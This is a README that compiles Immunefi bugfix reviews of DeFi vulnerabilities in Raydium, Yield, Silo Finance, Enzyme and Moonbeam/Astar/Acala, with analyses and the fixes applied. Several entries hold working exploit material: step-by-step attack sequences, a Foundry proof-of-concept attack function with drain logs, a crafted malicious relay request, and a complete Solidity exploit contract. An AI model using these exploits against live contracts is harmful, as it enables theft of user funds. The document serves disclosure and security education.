# Immunefi Bug Fixes

This repository documents research on critical bug fixes identified on Immunefi in 2023-2024, highlighting how these vulnerabilities were exploited, their impact on projects, and the subsequent fixes implemented. The goal is to provide insights into common pitfalls, remediation strategies, and lessons learned from real-world bug bounty reports.

# 1. Raydium - Tick Manipulation

Reported by: @riproprip

Protocol: Raydium

Date: January 10, 2024

Bounty: $505,000 in RAY tokens

### TL;DR

The vulnerability in Raydium's `increase_liquidity` function allowed attackers to manipulate liquidity at arbitrary price points by exploiting the `tickarray_bitmap_extension`. The function failed to verify if the account used for this extension was correct, letting attackers misuse it to "flip" tick statuses and perform unauthorized liquidity operations. This manipulation could significantly impact the pool's integrity and lead to financial loss. The fix involved adding a validation step to ensure the correct `TickArrayBitmapExtension` account is used, preventing these unauthorized actions.

### Vulnerability Analysis

Raydium is an AMM with an integrated central order book system. Users can provide liquidity, perform swaps on the exchange, and stake the RAY token for additional yield. A fundamental aspect of Raydium is the Concentrated Liquidity Market Maker (CLMM).

The vulnerability was located within the [increase_liquidity](Raydium/increase_liquidity.rs) file of the Raydium protocol. It conducts several critical operations, including pool status validation, token amount calculations based on user-provided maximums, fee updates, and the actual increase of liquidity in the position’s state.

Ticks represent discrete price points in a CLMM. By defining a range with tick_lower and tick_upper, an LP specifies the boundaries within which their liquidity will be active.

The flaw was specifically in the conditional handling of the [tickarray_bitmap_extension](https://github.com/tpiliposian/Immunefi_bugfixes/blob/bde6c3486e58d91fff972cbdb12b8c4d56f2327f/Raydium/increase_liquidity.rs#L291):

```rust
let use_tickarray_bitmap_extension = pool_state.is_overflow_default_tickarray_bitmap(vec![tick_lower, tick_upper]);

[...]

if use_tickarray_bitmap_extension {
    Some(&remaining_accounts[0])
} else {
    None
}
```

The `tickarray_bitmap_extension` is crucial in managing the pool’s pricing at extreme boundaries (very high or low prices). It also acts as an extended index to manage a larger range of price ticks which helps track which ticks have been initialized (i.e., have non-zero liquidity) beyond the default capacity of the system. The conditional logic decides whether an account from `remaining_accounts` is needed for the operation. This account is presumably related to handling the tick array bitmap extension. This function is designed to increase liquidity in a specific position within a liquidity pool using the remaining_accounts vector.

`remaining_accounts` is a vector containing all accounts passed into the instruction but not declared in the Accounts struct. This is useful when you want your function to handle a variable amount of accounts, e.g. when initializing a game with a variable number of players.

The vulnerability arises because the function fails to verify whether `remaining_accounts[0]` is the accurate `TickArrayBitmapExtension` account linked to the current state of the pool. This oversight permits an attacker to execute liquidity operations at arbitrary price boundaries as described in the vulnerability demonstration section below.

### Steps of the Attack:

- Create a Secondary Pool: The attacker sets up a secondary pool.
- Target a Tick: They open a position at a specific tick they want to exploit in the primary pool.
- Zero Out and Manipulate Liquidity: They reduce the liquidity at this tick to zero and then increase it in a way that incorrectly uses the tickarray_bitmap of the primary pool.

This manipulation lets the attacker “flip” a tick’s status in the bitmap. Transactions that should have adjusted liquidity at certain prices bypass these checks, allowing unauthorized liquidity increases.

To clarify the exploit process using a practical example, consider price points A, B, and C, with A < B < C and both A and B within the lower range of the `bitmap_array`.
The steps to exploit the vulnerability are as follows:
1. Identify a victim pool.
2. Execute a swap to shift the price to just above point A (A+1).
3. Create liquidity within the price range B to C.
4. Perform a swap across B without crossing C, which adds liquidity to the pool state due to the manipulated `tickarray_bitmap`.
5. Execute the described attack to switch the `tickarray_bitmap` status at B to DISABLED, allowing a swap at A+1 to skip over B without affecting liquidity.
6. Repeat the attack to re-enable the `tickarray_bitmap` at B.
7. Perform another swap over B without crossing C, effectively doubling the liquidity erroneously.
8. This process can be repeated as many times as desired to amass an excessive amount of liquidity.
9. Following this procedure, swaps directed towards C will yield disproportionately high amounts of Token A, indicating the vulnerability has been fully exploited.
10. If the goal is to acquire Token B, the process can be replicated at the higher end of the price spectrum.
The core issue is the ability to “flip” a tick’s status within the tickarray_bitmap, allowing liquidity to be added without proper checks. This leads to significant discrepancies in liquidity management and compromises the integrity of the liquidity pool.

### Vulnerability Fix

The correction involved adding a security check to ensure the correct application of the `tickarray_bitmap_extension`:

```rust
if use_tickarray_bitmap_extension {
    require_keys_eq!(
        remaining_accounts[0].key(),
        TickArrayBitmapExtension::key(pool_state_loader.key())
    );
    Some(&remaining_accounts[0])
} else {
    None
}
```

This [fix](https://github.com/raydium-io/raydium-clmm/commit/83b5a471f2323fcac3848addab725b95e09ddeb8?source=post_page-----c6aae4527ed6--------------------------------) introduces a validation step to confirm that the `remaining_accounts[0]` is the correct `TickArrayBitmapExtension` account associated with the pool’s current state.
This ensures the proper handling of liquidity operations involving extreme price boundaries, thereby preventing the exploitation of this vulnerability in the future.

# 2. Yield Protocol - Logic Error

Reported by: @Paludo0x

Protocol: Yield

Date: April 28th, 2023

Bounty: $95,000 USDC

### TL;DR

The vulnerability in the Yield Protocol's strategy contract arises from the `burn()` function, which calculates the LP tokens to return to the user based on the current balance of LP tokens in the contract (`pool.balanceOf(address(this))`). An attacker can inflate this balance by sending extra LP tokens to the contract before calling burn, allowing them to withdraw more tokens than they originally deposited, effectively stealing from the protocol.

### Vulnerability Analysis

Yield Protocol is a DeFi protocol that enables fixed-rate, fixed-term loan options between borrowers and lenders.

The protocol facilitates these transactions via `fyTokens` (fixed yield tokens), a type of `ERC-20` token that can be exchanged one-to-one for an underlying asset upon reaching a predetermined maturity date.

The vulnerability is associated with the [strategy contract](https://arbiscan.io/address/0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0#code) of the protocol, which enables liquidity providers to deposit combined liquidity to a `YieldSpace` Pool.

By depositing funds into the strategy contract, liquidity providers can mint strategy tokens. The amount of strategy tokens they receive corresponds proportionately to their deposit amount, allowing them to burn and redeem the LP tokens as well as any gain in fees/interest later.

This vulnerability is associated with the burning shares functionality `burn(address to)` of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens:

```solidity
    function burn(address to)
        external
        isState(State.INVESTED)
        returns (uint256 poolTokensObtained)
    {
        // Caching
        IPool pool_ = pool;
        uint256 poolCached_ = poolCached;
        uint256 totalSupply_ = _totalSupply;

        // Burn strategy tokens
        uint256 burnt = _balanceOf[address(this)];
        _burn(address(this), burnt);

        poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
        pool_.safeTransfer(address(to), poolTokensObtained);

        // Update pool cache
        poolCached = poolCached_ - poolTokensObtained;
    }
```

Initially, the contract’s strategy tokens are burned. Then, the amount of liquidity pool tokens to be acquired are calculated based on the LP tokens contained in the strategy contract and are transferred to the designated address.

The pool tokens to be returned to the caller are calculated by:

```solidity
poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
```

This calculation is based on the LP tokens balance of the current strategy contract which could be inflated by sending the pool tokens directly to it.

The attacker has control over `pool.balanceOf(address(this))`, which allows them to inflate the pool tokens returned, by transferring a specific amount of pool tokens directly to the strategy contract before burning the strategy shares tokens.

As the pool tokens remain within the Strategy contract, the attacker making the call can mint the share tokens and then burn them back to retrieve the pool tokens that were utilized to inflate the calculation.

This is done by the call to `mint()` function to get the strategy share tokens then the call to `burn()` function again to get back the LP tokens that were transferred.

### PoC:

- Clone the Immunefi bugfix review repository: `git clone https://github.com/immunefi-team/bugfix-reviews-pocs.git`
- Run `forge test -vvv --match-path ./test/YieldProtocol/AttackTest.t.sol`

Attack function:

```solidity
    function _executeAttack() internal {
        console.log("\n>>> Execute attack\n");

        //burning of strategy tokens
        uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);

        //burning remaing part of LP tokens sent to strategy
        strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
        strategyYSDAI6MMS.burn(ada);

        //retrieving and converting all tokens to base token
        FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
        FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
        FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
        FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.

        console.log("Tokens Burnt : ",tokensBurnt);

        _completeAttack();
    
    }
```

Log output:

```
Ran 1 test for test/YieldProtocol/AttackTest.t.sol:AttackTest
[PASS] testAttack() (gas: 677227)
Logs:
  
>>> Initiate attack

  Tokens Obtained :  20916988492243432153263
  
>>> Execute attack

  Tokens Burnt :  32081082781615545896437
  
>>> Attack complete

  holder gain in base wei :  11096784340278200659569
  pool gain in base wei :  -11096784340278200659569
  Strategy gain in base wei :  0
  holder gain in FYToken :  0
  pool gain in FYToken :  0
  Strategy gain in FYToken :  0
  holder gain in LPToken :  0
  pool gain in LPToken :  0
  Strategy gain in LPToken :  -11164094289372113743173
  Pool base token amount before transactions: 1.3330628639753853259506e22
  Pool base token amount after transactions: 2.233844299475652599937e21
  holder base token amount before transactions: 1e24
  holder base token amount after transactions: 1.011096784340278200659569e24

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.61s (6.15s CPU time)
```

### Vulnerability Fix

In the patch, the project team modified the `burn()` function in the strategy contract to use `poolCached_` instead of `pool.balanceOf(address(this))` to determine the number of LP tokens that should be transferred to the caller, fixing the issue.

The new formula would be:

```solidity
poolTokensObtained = poolCached_ * burnt / totalSupply_;
```

# 3. Silo Finance - Logic Error

Reported by: @kankodu

Protocol: Silo Finance

Date: April 28th, 2023

Bounty: $100,000 USDC

### TL;DR



### Vulnerability Analysis

The whitehat reported the vulnerability in the [Base](https://github.com/silo-finance/silo-core-v1/blob/master/contracts/BaseSilo.sol) Silo contract which is responsible for handling the core logic of the lending protocol. The Silo contract is a lending protocol which allows users to deposit collateral asset tokens to the contract by calling the `deposit()` function of the contract. In return, the contract mints the share of tokens to the depositor based on the deposited amount and the total supply of the share and updates the storage state `_assetStorage[_asset]` with the deposited amount:

```solidity
       AssetStorage storage _state = _assetStorage[_asset];


       collateralAmount = _amount;


       uint256 totalDepositsCached = _collateralOnly ? _state.collateralOnlyDeposits : _state.totalDeposits;


       if (_collateralOnly) {
           collateralShare = _amount.toShare(totalDepositsCached, _state.collateralOnlyToken.totalSupply());
           _state.collateralOnlyDeposits = totalDepositsCached + _amount;
           _state.collateralOnlyToken.mint(_depositor, collateralShare);
       } else {
           collateralShare = _amount.toShare(totalDepositsCached, _state.collateralToken.totalSupply());
           _state.totalDeposits = totalDepositsCached + _amount;
           _state.collateralToken.mint(_depositor, collateralShare);
       }
```
The users who deposit the collateral in the contract can borrow other assets from the protocol by using the `borrow()` function, which updates the accrued interest rate of the borrowing asset first and then checks to see if the current contract has enough tokens for the user to borrow. Then, the function transfers the tokens to the user and checks the loan-to-value (LTV) ratio based on the collateral provided.

```solidity
   function _borrow(address _asset, address _borrower, address _receiver, uint256 _amount)
       internal
       nonReentrant
       returns (uint256 debtAmount, uint256 debtShare)
   {
       // MUST BE CALLED AS FIRST METHOD!
       _accrueInterest(_asset);


       if (!borrowPossible(_asset, _borrower)) revert BorrowNotPossible();


       if (liquidity(_asset) < _amount) revert NotEnoughLiquidity();

   /// @inheritdoc IBaseSilo
   function liquidity(address _asset) public view returns (uint256) {
       return ERC20(_asset).balanceOf(address(this)) - _assetStorage[_asset].collateralOnlyDeposits;
   }
```

On a high level, the vulnerability allows an attacker to manipulate the utilization rate of an asset that had zero total deposit to the contract. An attacker can manipulate the utilization rate by donating an ERC20 asset to the contract, and if the attacker had the majority of the shares in the market for that particular asset, borrowing the donated token would inflate the utilization rate of that particular asset. In general, the steps to reproduce this attack:

1. Determine a market that had 0 total deposits for one of the assets in the market. For example, WETH had 0 total deposits.
2. Become the majority shareholder for that particular asset by depositing WETH to that market, which will make the `totalDeposits` for that asset non-zero.
3. Donate additional WETH to the market, which will allow other users to borrow more WETH than the total deposited WETH, on step 2.
4. Use another user/address to deposit another asset in the market, to borrow the donated WETH.
5. In the next block, if `accrueInterest()` is called, the utilization rate of the attacker's initial deposited amount will be over 100%, which will increase the interest rate to an extremely high value.
6. Because of this inflated interest rate, the attacker’s initial deposit is valued more than it should be, and it allows the attacker to borrow most of the funds in the market.

```solidity
   /// @inheritdoc IBaseSilo
   function liquidity(address _asset) public view returns (uint256) {
       return ERC20(_asset).balanceOf(address(this)) - _assetStorage[_asset].collateralOnlyDeposits;
   }
```

### PoC

The steps to use this POC is as follows:


1. Install https://github.com/foundry-rs/foundry
2. Replace `Counter.sol` with [BugFixReview.sol](SiloFinance/BugFixReview.sol)
3. Replace `Counter.t.sol` with [BugFixReview.t.sol](SiloFinance/BugFixReview.t.sol)
4. Run `forge test — match-path test/BugFixReview.t.sol -vvv`

This POC will make a local fork on 17139470 and 17139471 and will try to manipulate the interest rate on the first block before stealing funds on the second block. Since the attack occurs over two blocks, we can’t use a flashloan to demonstrate the attack.

What we can do instead is to use deal from Forge to manipulate the attacker contract balance.

### Vulnerability Fix

The project temporarily fixed the vulnerable market after the report was submitted, and after the proper fix is ready, the code is deployed to the mainnet.

The first mitigation that the project implemented was to deposit an asset to the market that had 0 total deposits in the market, which can be seen in this transaction.

However, this deposit only mitigated the vulnerable market temporarily. For the permanent fix, the project implemented a cap in the utilization rate calculation and limited the maximum compounded interest rate to 10k % APR. The former one is to make sure that the utilization rate never exceeds 100% of utilization rate. And the latter is to stop producing yield after compounded interest passes 10%, unless `accrueInterest()` is being called.

To make sure the fixes that the project implemented are secure and didn’t leave any edge cases, the code went through formal verification from Certora, with added rules that cover this vulnerability. Those rules are:


`cantExceedMaxUtilization` and `interestNotMoreThenMax`.

- `cantExceedMaxUtilization` is an invariant that guarantees that the utilization rate never exceeds 100%. This means that no one can borrow more than the deposited amount.
- `interestNotMoreThenMax` tests the fixes to make sure that the interest rate cannot exceed the max limit.

The details for both of these rules/specs were already published by the project, which you can access in their [Github](https://github.com/silo-finance/silo-core-v1/blob/e5d16f201ab2139829d45ed881532c936249d3a5/certora/specs/interest-rate-model/CertoraInterestRate.spec#L4-L46).

The permanent fix can be seen at [this address](https://etherscan.io/address/0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314#code).

For further information regarding the fixes that Silo Finance and Certora made to fix this vulnerability, you can read [here](https://medium.com/silo-protocol/vulnerability-disclosure-2023-06-06-c1dfd4c4dbb8) and [here](https://medium.com/certora/silo-finance-post-mortem-3b690fffeb08).

# 4. DFX Finance - Rounding Error

Reported by: @perseverance

Protocol: DFX Finance

Date: April 28, 2023

Bounty: $100,000 USDT

### TL;DR



### Vulnerability Analysis



# 5. Enzyme Finance - Missing Privilege Check

Reported by: @rootrescue

Protocol: Enzyme Finance

Date: Mar 28, 2023

Bounty: $400,000

### TL;DR

Enzyme Finance's use of the Gas Station Network had a vulnerability in their `preRelayedCall()` function due to missing validation of the forwarder address. Attackers could exploit this by using a malicious forwarder to relay transactions and manipulate fees, allowing them to drain funds from the paymaster. The fix added a check to ensure only trusted forwarders are used, preventing unauthorized fee manipulation and protecting the system from exploitation.

### Vulnerability Analysis

Enzyme Finance is a decentralized asset management platform built on Ethereum. It enables anyone to create, manage, and invest in custom investment strategies using a variety of different assets, including cryptocurrencies and other digital assets.

Enzyme makes use of the Gas Station Network (GSN) to allow gasless clients to interact with Ethereum smart contracts without users needing ETH for transaction fees.

### GSN

The GSN is a decentralized network of relayers that allows dApps to pay the costs of transactions instead of individual users. This can lower the barrier of entry for users and increase user experience by allowing users to make gasless transactions. 

The GSN makes use of `meta-transactions`. `Meta-transactions` are a design pattern in which users sign messages containing information about a transaction they would like to execute, but relayers are responsible for signing the Ethereum transaction, sending it to the network, and paying the gas cost.

The flow of meta-transactions is as follows:

1. The user sends a signed message to the relay server containing transaction details.
2. The relay server verifies the transaction and ensures that there are sufficient fees to cover the costs.
3. The relay server generates a new transaction that uses the user’s signed message, trusted forwarder’s address, and paymaster’s address to call the relay hub.
4. The relay server signs the new transaction and sends it to the Ethereum network, paying the necessary gas fees in advance.
5. After receiving the transaction, the relay hub calls the trusted forwarder contract with the user’s signed message and then calls the recipient contract.
6. The trusted forwarder validates the user’s signature, recovers the user’s address, and transmits the transaction to the recipient contract.
7. The transaction is executed and the blockchain state is updated by the recipient contract.
8. Following the completion of the transaction, the relay hub requests reimbursement from the paymaster contract for the relay server’s gas fees.
9. The paymaster contract validates the transaction and sends funds (in tokens or ETH) to the relay server to cover the gas fees and any additional service fees.

Enzyme has a set of contracts that support the use of the GSN. This consists of `GasRelayPaymasterLib`, `GasRelayPaymasterFactory`, and `GasRelayRecipientMixin`. The `GasRelayPaymasterFactory` helps create instances of paymasters, and the `GasRelayRecipientMixin` has shared logic that is inherited for `relayable` transactions. The `GasRelayPaymasterLib` is responsible for providing the logic for paymasters, and importantly, the rules for calls that can be relayed. The paymaster is intended to validate that the forwarder is approved by the paymaster as well as by the recipient contract in `preRelayedCall()` function:

```solidity
    function preRelayedCall(
        GsnTypes.RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        uint256 maxPossibleGas
    )
    external
    override
    returns (bytes memory, bool) {
        _verifyRelayHubOnly();
        _verifyForwarder(relayRequest);
        _verifyValue(relayRequest);
        _verifyPaymasterData(relayRequest);
        _verifyApprovalData(approvalData);
        return _preRelayedCall(relayRequest, signature, approvalData, maxPossibleGas);
    }
```

However, within Enzyme’s `GasRelayPaymasterLib` contract, the external function which contained the check for a valid forwarder was overridden:

```solidity
    /// @notice Checks whether the paymaster will pay for a given relayed tx
    /// @param _relayRequest The full relay request structure
    /// @return context_ The tx signer and the fn sig, encoded so that it can be passed to `postRelayCall`
    /// @return rejectOnRecipientRevert_ Always false
    function preRelayedCall(
        IGsnTypes.RelayRequest calldata _relayRequest,
        bytes calldata,
        bytes calldata,
        uint256
    )
        external
        override
        relayHubOnly
        returns (bytes memory context_, bool rejectOnRecipientRevert_)
    {
        address vaultProxy = getParentVault();
        require(
            IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),
            "preRelayedCall: Unauthorized caller"
        );

        bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
        require(
            __isAllowedCall(
                vaultProxy,
                _relayRequest.request.to,
                selector,
                _relayRequest.request.data
            ),
            "preRelayedCall: Function call not permitted"
        );

        return (abi.encode(_relayRequest.request.from, selector), false);
    }
```

When a relayed transaction is sent via GSN in a typical flow, the trusted forwarder is being relied on to perform an important security check, verifying the user’s signature when a transaction is relayed. Since a malicious trusted forwarder can be provided due to missing verification of the provided forwarder’s address in the paymaster, the signature verification can be bypassed, and a relay call can be crafted in such a way that the paymaster returns much more fees than expected since the `from` address is believed to be the address which matches the signature provided. An attacker would craft the following parameters of `relayCall` to exploit the missing validation after deploying a malicious forwarder:

```js
const relayRequest = {
      from: VaultOwnerAddr, // Address to emulate (signature not verified)
      to: ComptrollerProxyAddr, // Bypass checks in preRelayedCall()
      value: 0,
      gas: ...,
      nonce: ...,
      data: '0x39bf70d1', // 0x39bf70d1 == callOnExtension()
      validUntil: ...,
};

const relayData = {
      gasPrice: ...,
      pctRelayFee: 1000, // 1000% fee to be returned to relay worker
      baseRelayFee: 0, // Base fee can be used to manipulate returned funds
      relayWorker: RelayWorkerAddr, // Attacker relay worker
      paymaster: PaymasterAddr, // Enzyme controlled paymaster
      forwarder: ExploitForwarder.address, // Attacker malicious forwarder
      paymasterData: true, // top up the paymaster if not enough funds
      clientId: ...,
};

let tx = await RelayHub.connect(impersonatedSigner)
      .relayCall(defaultMaxAcceptance,
            {
                   request: relayRequest,
                   relayData: relayData
            },
            requestSignature,
            approvalData,
            externalGasLimit,
      );
```

The most relevant changes to the relay data are the `forwarder`, which is set to the malicious forwarder deployed by the attacker, and the `pctRelayFee` and `baseRelayFee` which can be used to manipulate the amount of funds returned to the relayWorker by the paymaster.

### Vulnerability Fix

To address this issue, Enzyme introduced the following [commit](https://github.com/enzymefinance/protocol/commit/e813a20f36565feffb0f07993a730505c7949830) to add the required check within the GasRelayPaymasterLib, which verifies if the passed address is a trusted forwarder and reverts otherwise.

```diff
    function preRelayedCall(
        IGsnTypes.RelayRequest calldata _relayRequest,
        bytes calldata,
        bytes calldata,
        uint256
    )
        external
        override
        relayHubOnly
        returns (bytes memory context_, bool rejectOnRecipientRevert_)
    {
+       require(
+           _relayRequest.relayData.forwarder == TRUSTED_FORWARDER,
+           "preRelayedCall: Unauthorized forwarder"
+       );

        address vaultProxy = getParentVault();
        require(
            IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),
            "preRelayedCall: Unauthorized caller"
        );

        bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
        require(
            __isAllowedCall(
                vaultProxy,
                _relayRequest.request.to,
                selector,
                _relayRequest.request.data
            ),
            "preRelayedCall: Function call not permitted"
        );

        return (abi.encode(_relayRequest.request.from, selector), false);
    }
```

# 6. Moonbeam, Astar, And Acala - Library Truncation

Reported by: @pwning.eth

Protocol: Moonbeam, Astar Network, and Acala

Date: June 27th, 2023

Bounty: $1,000,000

### TL;DR

In the Frontier pallet for Substrate, there's a vulnerability due to the truncation of `msg.value` from 256 bits to 128 bits in the `transfer` function. This causes smart contracts to mistakenly accept large values as valid when they are actually truncated to zero. An attacker can exploit this by creating and withdrawing from wrapper tokens as if they had deposited a large amount of value, leading to the potential draining of all wrapped tokens on the network. This can also affect DEXes by allowing attackers to drain tokens from them as well.

### Vulnerability Analysis

The bug, which was found within Frontier — the Substrate pallet that provides core Ethereum compatibility features within the Polkadot ecosystem–impacted Moonbeam, Astar Network, and Acala.

On Moonbeam, we have native tokens like `MOVR` and `GLMR` and their wrapped counterparts, like `WMOVR` and `WGLRM`. Likewise, on Astar, there is `Astar` and `Wrapped Astar`.

The central issue was with how Frontier handled low-level EVM events:

```rust
	fn transfer(&mut self, transfer: Transfer) -> Result<(), ExitError> {
		let source = T::AddressMapping::into_account_id(transfer.source);
		let target = T::AddressMapping::into_account_id(transfer.target);

		T::Currency::transfer(
			&source,
			&target,
@>			transfer.value.low_u128().unique_saturated_into(),
			ExistenceRequirement::AllowDeath,
		)
		.map_err(|_| ExitError::OutOfFund)
	}
```

In the above code snippet, we notice in `transfer` that the `msg.value` is reduced (or truncated) from 256 bits to 128 bits. This seemingly innocuous oversight might result in a serious discrepancy between the runtime and the EVM environment.

What is truncation? In simplest terms, truncation means to cut off a portion of the number. If we do decimal truncation of 9.8, we would cut off 0.8 and we would be left with 9. In bit truncation, we truncate the higher bits of a number. For example, truncating a 32 bit number to 16 bits would result in higher-end bits being cut off and only the lower 16 bits staying.

65539 (32 bit) to 16 bit would result in the number 3. Why?

65539 is 10000000000000011 in binary. As it only takes 17 bits to hold that number, we only leave with the lower 16 bits (counting from right), and we are left with 0000000000000011, which is 3.

What does this all mean in the context of the bug? Smart contracts believe that the huge 256 bit `msg.value` is valid, although the actual transfer never happens, as the truncated value will be zero, even though we passed in `msg.value` `2¹²⁸`.

In reality, we won’t be transferring any native tokens, due to this error. However, smart contracts that accept `msg.value` as though it were in 256 bit format (wrapper contracts, for example), will think we transferred `2¹²⁸`!

With this trick, we could create as many wrapper tokens as we wanted to and later withdraw everything from wrapper contracts. This would drain every wrapped token on the network.

But that’s not all. With DEXes accepting native transfer of tokens to swap to any other token, we could also drain all DEXes on such a network.

To illustrate the above, here is a sample contract to exploit the bug:

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0;

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract Exploit {
    IWMOVR private wmovr;

    constructor(address _wmovr) {
        wmovr = IWMOVR(_wmovr);
    }

    function depositWMOVR() payable external {
        uint256 val = msg.value + (1 << 128);
        wmovr.deposit{value: val}();
    }

    function withdrawMOVR(uint256 amount) external {
        wmovr.withdraw(amount);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {}
}
```

A step-by-step guide for understanding how the exploit works practically:

1. Deploy the above exploit contract onto the Moonbeam network with the address of the Wrapped MOVR contract.
2. Call `depositWMOVR()` function with `msg.value=0`. The `val` will be evaluated into `2¹²⁸ + 0`. This will mean that during the deposit into `WMOVR`, we won’t be transferring any `MOVR` as it will be truncated to `0`.
3. Call `withdrawMOVR()`. The `WMOVR` contract will think we deposited `2¹²⁸` in the previous step thus allowing us to get `2¹²⁸` `MOVR` by only paying for the transaction fees!
4. Profit.

### Vulnerability Fix

Moonbeam released a new Runtime 1606 which addressed the issue by removing the truncation. More information about the fix can be found [here](https://moonbeam.network/news/moonbeam-team-releases-urgent-security-patch-for-integer-truncation-bug) in their security announcement.

As Moonbeam is also one of the maintainers of the library, they released a [bug fix](https://github.com/moonbeam-foundation/frontier/compare/652abf16...ca027df5).

## References

[1]. https://medium.com/immunefi/raydium-tick-manipulation-bugfix-review-c6aae4527ed6

[2]. https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50

[3]. https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a

[4]. https://medium.com/immunefi/dfx-finance-rounding-error-bugfix-review-17ba5ffb4114

[5]. https://medium.com/immunefi/enzyme-finance-missing-privilege-check-bugfix-review-ddb5e87b8058

[6]. https://medium.com/immunefi/moonbeam-astar-and-acala-library-truncation-bugfix-review-1m-payout-41a862877a5b

## Contact

For questions or suggestions, please contact [me](https://x.com/tpiliposian).

Tigran Piliposyan
